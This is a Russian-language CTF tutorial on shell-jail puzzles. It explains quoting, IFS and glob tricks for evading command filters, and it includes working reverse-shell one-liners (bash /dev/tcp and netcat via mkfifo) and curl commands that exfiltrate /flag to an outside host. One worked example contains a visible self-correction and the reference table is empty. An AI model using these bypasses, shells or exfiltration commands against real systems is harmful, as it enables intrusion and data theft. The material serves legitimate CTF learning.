## Что такое shell-головоломки

Задачи, где нужно составить команду, обойти фильтр или понять, что именно исполнит shell. Часто это «джейл»: вам дают ограниченный shell и просят прочитать флаг. Ключ — точное понимание, как shell **разбирает строку** до запуска программы.

## Quoting и экранирование

Shell обрабатывает кавычки до передачи аргументов:

- `'...'` — одинарные: всё буквально, подстановок нет;
- `"..."` — двойные: работают `$VAR`, `$(...)`, `\`` `, но не glob;
- `\` — экранирует один символ.

```bash
echo '$HOME'    # $HOME
echo "$HOME"    # /home/user
echo \$HOME     # $HOME
```

Если фильтр запрещает пробелы, используйте `${IFS}` (Internal Field Separator) или табы:

```bash
cat${IFS}/flag
cat</flag
```

## Command substitution

`$(cmd)` и `` `cmd` `` подставляют вывод команды. Это частая основа джейлов:

```bash
echo $(id)
echo `whoami`
```

Обратные кавычки внутри двойных кавычек работают, внутри одинарных — нет.

## Подстановки: brace и glob

```bash
echo {a,b,c}        # a b c
echo {1..5}         # 1 2 3 4 5
ls /etc/*.conf      # glob
cat /f?ag            # ? — один любой символ
```

Brace expansion происходит до glob и до запуска команды. `?` и `*` — мощные обходы, когда запрещены буквы.

## Опасные конструкции

- **`eval`** — исполняет строку как код; классический вектор инъекции.
- **`$IFS`** — разделитель полей; обход запрета пробелов.
- **`$(...)` внутри аргументов** — неожиданное исполнение.
- **Здесь-строки** `<<<` и here-doc `<<EOF`.

```bash
# обход запрета на пробелы и слово "cat"
c=a;t=c; $c$t${IFS}/flag
```

## Bash-специфичные трюки

- **`$'\x63\x61\x74'`** — ANSI-C quoting: собирает строку из байтов.
- **`${VAR:offset:len}`** — подстрока переменной.
- **`!!`** — повтор последней команды.
- **`~+`/`~-`** — текущий/предыдущий каталог.
- **Glob для файлов**: `cat /???/?????` вместо явных имён.

```bash
echo $'\x66\x6c\x61\x67'    # flag
```

## Инструменты

- **bash/zsh** — сам shell; `bash -x` для трассировки.
- **shellcheck** — статический анализ.
- **explainshell.com** — разбор команды по частям.
- **Песочницы** (`docker run -it bash`) — безопасное тестирование.

## Разобранный пример

Дан фильтр: нельзя писать пробелы и слово `cat`. Читаем флаг:

```bash
c=a;t=c; $c$t${IFS}/flag.txt
```

Разбор: `c` собирает `c`, `t` собирает `t`, `$c$t` даёт `ct`? — нет, нужно `ca`+`t`. Корректно:

```bash
a=ca;b=t;$a$b${IFS}/flag.txt
```

`$a$b` → `cat`, `${IFS}` → пробел, `/flag.txt` — путь. Фильтр по словам обойдён сборкой из частей.

## Частые ошибки и подводные камни

- **Путаница кавычек.** Одинарные отключают подстановки, двойные — нет.
- **Порядок разбора.** Brace → tilde → переменные → подстановка команд → glob → запуск.
- **Локаль.** `${IFS}` по умолчанию пробел/таб/новая строка.
- **`eval` на недоверенном вводе.** Прямой путь к RCE.
- **Bash vs sh.** Не все трюки (например, `$'...'`) работают в `dash`.

## Справочная таблица

| Трюк | Смысл |

## Что дальше / решение

1. Поймите, что фильтруется: пробелы, буквы, слова, символы.
2. Соберите запрещённое из частей (`$a$b`) или байтов (`$'\xNN'`).
3. Замените пробелы на `${IFS}`, табы или `<`.
4. Используйте glob `?`/`*` для путей.
5. Проверяйте в песочнице, прежде чем ломать «боевой» shell.

## Ограниченные shell и escape

В CTF часто дают «урезанный» shell: только `ls`, `cat`, `echo`. Способы расширить возможности:

- **`$(...)` внутри разрешённой команды** — если `echo` разрешён, `echo $(cat /flag)` исполнит `cat`;
- **перенаправления** — `cat < /flag` или `cat 0< /flag`;
- **`printf`/`echo` + `eval`** — собрать команду из строк;
- **переменные окружения** — `$PATH`, `${IFS}`, `$'\x..'`;
- **встроенные команды shell** — `read`, `printf`, `source`, `.`.

```bash
# если разрешён только ls
ls /; cat /flag 2>/dev/null || echo $(cat /flag)
```

Если заблокированы имена программ, их собирают из переменных: `a=ca;b=t;$a$b /flag`.

## Разбор порядка подстановок

Понимание порядка критично для обхода фильтров. Bash выполняет:

1. brace expansion `{a,b}`;
2. tilde `~`;
3. подстановку параметров `$VAR`;
4. command substitution `$(...)` и арифметику `$((...))`;
5. разбиение на слова (по `$IFS`);
6. glob `*?[]`;
7. запуск команды.

Поэтому `echo {a,b}$(id)` сначала раскроет brace, затем исполнит `id`. Зная порядок, можно «протащить» запрещённые символы через переменные.

## Частые вопросы по shell-задачам

- **Запрещены пробелы?** `${IFS}`, таб, `<`, `%20` (в URL-контексте).
- **Запрещены буквы?** Glob `?`, `*`, ANSI-C `$'\x..'`.
- **Запрещён `cat`?** `tac`, `head`, `sed`, `dd`, `paste`, `awk`.
- **Нужен reverse shell?** `bash -i >& /dev/tcp/ip/port 0>&1` или `nc`.

## Reverse shell и стабилизация

Если из задачи удалось получить исполнение команды, часто нужен обратный шелл:

```bash
bash -i >& /dev/tcp/10.0.0.1/4444 0>&1
```

или через netcat:

```bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.0.0.1 4444 > /tmp/f
```

После получения «тупого» шелла его стабилизируют (python pty + `stty raw -echo`), чтобы работали `Tab`, `Ctrl-C` и `vim`. Это стандартный шаг в web/pwn задачах.

## Работа без интерактива

Иногда команду нужно выполнить «вслепую» (нет TTY). Тогда:

- перенаправляйте вывод в файл и читайте его;
- используйте `curl` для эксфильтрации (`curl http://me/?x=$(cat /flag)`);
- применяйте `base64` для бинарных данных.

```bash
cat /flag | base64 | curl -s "http://10.0.0.1:8000/?d=$(cat)"
```

## Частые вопросы по shell-задачам

- **Нет TTY?** Используйте python-pty или `script`.
- **Заблокирован `bash`?** Пробуйте `sh`, `dash`, `zsh`, `busybox sh`.
- **Запрещены кавычки?** ANSI-C `$'\x..'` и `$IFS`.
- **Нужно ускорить перебор фильтров?** Автоматизируйте генерацией кандидатов.

## Кейс: обход фильтра на запрещённые символы

Дано: shell-джейл, запрещены пробел, `/`, буквы `f`, `l`, `a`, `g`. Читаем флаг через glob и подстановки:

```bash
cat ${PWD:0:1}????   # /flag? — приблизительно
```

Точнее, если запрещены буквы, собираем путь через `*`:

```bash
cat /[!x]*        # любой файл в корне, начинающийся не с x
ls /???/??????    # подбор по маске
```

Главное — помнить, что glob раскрывается **до** запуска команды, поэтому `?` и `*` работают, даже если буквы запрещены.

## Кейс: джейл без пробелов

Если пробелы фильтруются, используйте `${IFS}`, табы или перенаправление:

```bash
cat</flag
cat${IFS}/flag
{cat,/flag}
```

Фигурные скобки `{cat,/flag}` выполняют команду со списком аргументов без пробела.

## Итог по shell-задачам

Shell-головоломки — про понимание порядка разбора строки. Знание quoting, подстановок, `${IFS}`, glob и `$'\x..'` позволяет собрать запрещённые команды из частей и обойти почти любой фильтр. Всегда тестируйте приём в песочнице и помните: цель — прочитать флаг, а не запустить «красивый» шелл.

## Частые вопросы по shell-задачам (расширенно)

- **Нет `cat`?** Используйте `tac`, `head`, `sed -n`, `awk`, `dd`, `paste`, `sort`.
- **Нет пробелов?** `${IFS}`, таб (`$'\t'`), `<`, `{cmd,arg}`.
- **Запрещены кавычки?** ANSI-C `$'\x..'` и сборка слов из переменных.
- **Нужно прочитать бинарный файл?** `base64`, `xxd`, `od` и эксфильтрация через `curl`.
- **Как проверить приём?** В изолированном контейнере, а не на рабочей машине.
